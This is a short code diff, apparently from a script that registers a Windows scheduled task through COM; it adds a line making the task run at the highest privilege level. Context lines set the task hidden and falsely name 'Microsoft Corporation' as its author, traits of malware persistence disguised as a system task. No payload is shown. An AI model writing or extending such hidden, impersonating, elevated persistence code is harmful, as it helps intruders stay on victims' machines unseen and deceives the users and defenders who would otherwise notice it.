@@ -69,6 +69,7 @@ Set WshShell = Nothing
     task_def.Settings.Enabled = True
     task_def.Settings.Hidden = True
     task_def.RegistrationInfo.Author = "Microsoft Corporation"
+    task_def.Principal.RunLevel = 1
     task_def.Settings.StopIfGoingOnBatteries = False
 
     root_folder.RegisterTaskDefinition(
